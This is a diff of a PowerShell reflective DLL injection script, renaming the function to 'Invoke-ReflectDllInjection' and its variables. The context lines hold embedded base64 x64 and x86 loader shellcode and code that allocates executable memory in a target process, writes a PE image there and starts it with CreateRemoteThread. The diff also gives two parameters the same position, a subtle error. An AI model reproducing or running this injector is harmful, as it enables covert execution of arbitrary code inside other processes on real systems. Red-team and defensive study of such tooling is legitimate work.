@@ -1,9 +1,9 @@
-function PowerInjection
+function Invoke-ReflectDllInjection
 {
-    param([Parameter(Mandatory=$true,Position=0)][int]$id,[Parameter(Mandatory=$true,Position=1)][Byte[]]$PEBytes,[Parameter(Mandatory=$true,Position=2)][bool]$is64)
+    param([Parameter(Mandatory=$true,Position=0)][int]$id,[Parameter(Mandatory=$true,Position=1)][Byte[]]$PEBytes,[Parameter(Mandatory=$true,Position=1)][bool]$is64bit)
     Set-StrictMode -Version 2
-    $bytes_=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length);
-    [System.Runtime.InteropServices.Marshal]::Copy($bytes,0,$bytes_,$bytes.Length);
+    $PEBytes_=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length);
+    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes,0,$PEBytes_,$PEBytes.Length);
     $b64_x64='VkiJ5kiD5PBIg+wg6CMBAABIifRew8zM6eP////MzMxIi8RIiVgISIloEEiJcBhIiXggQVZIg+wQZUiLBCVgAAAAi+qL8UUz9kyLQBhNi1AQTTlyMA+EuwAAAE2LSjBFi8ZBDxBCWE2LEkljQTzzD38EJEaLnAiIAAAARYXbdNFIiwQkSMHoEGZEO/BzJEiLTCQID7fQD74BQcHIDYA5YXwEQYPA4EQDwEj/wUiD6gF15EQ7xnWaT40EGUWL3kGLWCBJA9lFOXAYdoaLO0GL1kkD+UiNWwQPvg9I/8fByg0D0YTJdfE71XQOQf/DRTtYGHLY6Vn///9Bi0AkQ40MG0kDwQ+3FAFBi0gcSQPJiwSRSQPB6wIzwEiLXCQgSItsJChIi3QkMEiLfCQ4SIPEEEFew8xIiVwkIFVWV0FUQVVBVkFXSIvsSIPsQEiL8cdF4HVzZXJFM+THReQzMi5ku9oWr5Jmx0XobGyLy0SIZeq6cmB3dMdF8G1zdmPHRfRydC5kZsdF+GxsRIhl+uiO/v//TIvoSI1N4EH/1UiNTfBB/9W6b+BT5YvL6HH+//+6fo2kUkiJRUCLy+hh/v//umCawlW5TxeaPkiL2OhP/v//TGN+PEWNTCRATAP+SIlFUDPJTIl9SEG4ADAAAEyL8EGLV1D/00WLR1RFjVwkAUiL+EiL1k2FwHQQSCvGigqIDBBJA9NNK8N180EPt08URQ+3TwZJA89Nhcl0NUiDwSyLUfhNK8tEiwFIA9dEi1H8TAPGTYXSdBBBigBNA8OIAkkD000r03XwSIPBKE2FyXXPQYufkAAAAEgD30Q5YwwPhJoAAABMi31Ai0sMSAPPQf/VizNMi+BEi3MQSAP3TAP361hIhfZ0LkiDPgB9KEljRCQ8D7cWQouMIIgAAABCi0QhEEKLTCEcSCvQSQPMiwSRSQPE6xBJixZJi8xIg8ICSAPXQf/XSYkGSI1GCEmDxghIhfZID0TGSIvwSYM+AHWiSIPDFEUz5EQ5YwwPhXf///9Mi31IRY1cJAFMi3VQTIvXTStXMEU5p7QAAAAPhLMAAABFi4ewAAAATAPHQYtABIXAD4SdAAAAvv8PAABBvQIAAABBixBJjVgIRIvISAPXSYPpCEnR6XRpTSvLRA+3G0EPt8NBD7fLZsHoDGaD+Ap1D0wj3k0BFBNBuwEAAADrOUG7AQAAAGaD+AN1CUgjzkQBFBHrJGZBO8N1EEgjzkmLwkjB6BBmAQQR6w5mQTvFdQhII85mRAEUEUkD3U2FyXWXQYtABEwDwEGLQASFwA+Fbv///0GLXyhFM8Az0kiDyf9IA99B/9ZFM8BIi89BjVAB/9NIi5wkmAAAAEiDxEBBX0FeQV1BXF9eXcM=';
     $b54_x32='g+wwU1VWvtoWr5LHRCQkdXNlcle6cmB3dMdEJCwzMi5ki85mx0QkMGxsxkQkMgDHRCQ0bXN2Y8dEJDhydC5kZsdEJDxsbMZEJD4A6FECAACL2I1EJChQiVwkGP/TjUQkNFD/07pv4FPli87oMQIAALp+jaRSiUQkHIvO6CECAAC6YJrCVblPF5o+i/DoEAIAAItsJERqQGgAMAAAiUQkLItdPAPdiVwkGP9zUGoA/9aLc1SL+Il8JCCL1YX2dA+LzyvNigKIBBFCg+4BdfUPt0sUD7drBoPBLIXtdDGLRCREA8uLUfhNizED14tZ/APwhdt0D4oGiAJCRoPrAXX1i0QkRIPBKIXtddmLXCQQi7OAAAAAA/eJdCREg34MAHR+i0YMA8dQ/1QkGItuEIseA+8D34lEJBiDfQAAdFCL8IXbdCKLC4XJeRyLRjwPt8mLRDB4K0wwEItEMByNBIiLBDADxusOi0UAg8ACA8dQVv9UJCSJRQCDxQSF241DBA9Ew4N9AACL2HW2i3QkRIPGFIl0JESDfgwAdYaLXCQQi+8razSDu6QAAAAAD4TRAAAAi7OgAAAAA/eJdCREjU4EiwGJTCQUhcAPhLQAAACLFo1eCIlcJBwD141Y+NHrD4SDAAAAi3QkHA+3BkuJRCQcD7fIZsHoDA+3+Il8JBhmg/gKdQ6LRCQcJf8PAAABLBDrQItEJBhmg/gDdQuB4f8PAAABLBHrKzP/R2Y7x3URgeH/DwAAi8XB6BBmAQQR6xJqAl9mO8d1CoHh/w8AAGYBLBFqAlgD8IXbdY2LfCQgi3QkRItMJBQDMYl0JESNTgSLAYlMJBSFwA+FUP///4tcJBCLcyhqAGoAav8D9/9UJDAzwGoAQFBX/9ZfXl1bg8Qww4PsGGShMAAAAFNVVotADFeJVCQgiUwkHItwDOmaAAAAi1YYM8mLRjCLXiyLNolEJBiLQjyJVCQQi0QQeIlEJBSFwHR2wesQM/+F23Qji1QkGA++LDrByQ2APDphfAODweADzUc7+3Lpi1QkEItEJBQ7TCQcdUSLbBAgM/+LTBAYA+qJTCQkhcl0MItFADPbA8KNbQSJRCQYi9CKCsHLDQ++wQPYQoTJdfGLVCQQO1wkIHQbRzt8JCRy0IN+GAAPhVz///8zwF9eXVuDxBjDi3QkFItEFiSNBHgPtwwQi0QWHI0EiIsEEAPC69s=';
     Function Get-ProcAddress
@@ -107,10 +107,10 @@ function PowerInjection
     
     [Uint32]$dwProtect = 0
     $lpshellcode = $VirtualAllocEx.Invoke($hProcess,0, $shellcode_.Length + 1, [va9.func+AllocationType]::Reserve -bOr [va9.func+AllocationType]::Commit, [va9.func+MemoryProtection]::PAGE_EXECUTE_READWRITE)
-    $lpfilebase = $VirtualAllocEx.Invoke($hProcess,0, $bytes.Length + 1, [va9.func+AllocationType]::Reserve -bOr [va9.func+AllocationType]::Commit, [va9.func+MemoryProtection]::PAGE_EXECUTE_READWRITE)
+    $lpfilebase = $VirtualAllocEx.Invoke($hProcess,0, $PEBytes.Length + 1, [va9.func+AllocationType]::Reserve -bOr [va9.func+AllocationType]::Commit, [va9.func+MemoryProtection]::PAGE_EXECUTE_READWRITE)
     if ([Bool]!$lpshellcode) { $global:result = 3; return }
     $WriteProcessMemory.Invoke($hProcess,$lpshellcode,$shellcode,$shellcode_.Length,0);
-    $WriteProcessMemory.Invoke($hProcess,$lpfilebase,$bytes_,$bytes.Length,0);
+    $WriteProcessMemory.Invoke($hProcess,$lpfilebase,$PEBytes_,$PEBytes.Length,0);
     if ($true ) {
             [IntPtr] $hthread = $CreateRemoteThread.Invoke($hProcess,[IntPtr]::Zero, 1024*1024,$lpshellcode,$lpfilebase,0,[IntPtr]::Zero);
             if ([Bool]!$hthread) { $global:result = 7; return }
